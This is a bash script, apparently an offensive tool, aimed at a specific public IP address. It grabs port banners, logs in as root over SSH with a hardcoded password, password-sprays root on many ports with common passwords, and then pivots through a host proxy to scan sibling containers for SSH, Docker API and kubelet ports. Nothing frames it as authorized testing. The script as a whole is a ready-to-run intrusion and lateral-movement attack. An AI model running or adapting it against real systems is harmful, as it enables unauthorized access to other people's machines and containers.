#!/bin/bash
set +e
echo "###P17START $(date -u)"
PORTS="11857 16069 16198 16991 17008 17225 17424 25197 29185 29443 32964 33974 40000 41368 42690 43482 48550 32917"
PWS="/&S2)n@W1G|admin|password|onething|Onething@2024|123456|root"
echo "=== BANNERS ==="
for p in $PORTS; do b=$(timeout 6 bash -c "exec 3<>/dev/tcp/116.211.127.168/$p && head -c 120 <&3" 2>/dev/null | tr -d '\r'); echo "$p :: ${b:0:100}"; done
echo "=== SSHAUTH-OURPW ==="
export SSHPASS='/&S2)n@W1G'
for p in $PORTS; do
  r=$(timeout 25 sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p $p root@116.211.127.168 'id; hostname; nvidia-smi -L 2>&1 | head -3' 2>&1 | tail -4 | tr '\n' '|')
  echo "$p :: ${r:0:180}"
done
echo "=== SSHAUTH-PWSPRAY-ROOT ==="
for pw in 'admin' 'password' 'onething' 'Onething@2024' '123456'; do
  for p in 11857 16069 25197 29185 29443 32964 33974 40000 41368 42690 43482 48550; do
    r=$(timeout 18 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p $p root@116.211.127.168 'id' 2>&1 | tail -1)
    case "$r" in *"denied"*|*"timed out"*|"") ;; *) echo "HIT $pw@$p :: $r";; esac
  done
done
echo "=== SIBLING-CONTAINERS-VIA-HOSTPROXY ==="
# from the container: connect through 172.17.0.1:1080 to sibling container IPs
sshpass -p "$SSHPASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -p 32917 root@116.211.127.168 'bash -s' <<'INNER'
for ip in 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6 172.17.0.7 172.17.0.8; do
  for pt in 22 2375 10250 9400 8188; do
    r=$(python3 - "$ip" "$pt" <<'PY'
import socket,sys
ip,pt=sys.argv[1],int(sys.argv[2])
s=socket.create_connection(("172.17.0.1",1080),timeout=4)
s.sendall(("CONNECT %s:%d HTTP/1.1\r\n\r\n"%(ip,pt)).encode())
b=s.recv(200)
print(b.split(b"\r\n")[0].decode('latin1'))
PY
)
    echo "$ip:$pt -> $r"
  done
done
INNER
echo "###P17END $(date -u)"
